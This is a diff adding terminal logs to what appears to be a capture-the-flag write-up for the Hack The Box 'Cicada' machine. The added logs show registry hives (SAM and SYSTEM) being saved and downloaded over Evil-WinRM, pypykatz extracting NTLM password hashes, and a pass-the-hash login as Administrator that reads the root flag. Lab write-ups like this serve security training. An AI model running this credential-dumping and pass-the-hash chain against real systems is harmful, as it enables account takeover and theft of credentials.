@@ -368,3 +368,67 @@ $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileNa
 Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
+
+```*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mkdir Temp
+
+
+    Directory: C:\Users\emily.oscars.CICADA
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/26/2025  12:06 AM                Temp
+
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Temp
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> reg save hklm\sam C:\Users\emily.oscars.CICADA\Temp\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> reg save hklm\system C:\Users\emily.oscars.CICADA\Temp\system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> download sam
+                                        
+Info: Downloading C:\Users\emily.oscars.CICADA\Temp\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Temp> download system
+                                        
+Info: Downloading C:\Users\emily.oscars.CICADA\Temp\system to system
+                                        
+Info: Download successful!
+```
+```
+pypykatz registry --sam sam system                                                                   
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 3c2b033757a49110a9ee680b46e8d620
+============== SAM hive secrets ==============
+HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+```
+
+
+```
+┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
+└─$ evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+a193211f7ab54667670030c871ba8a16
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+```
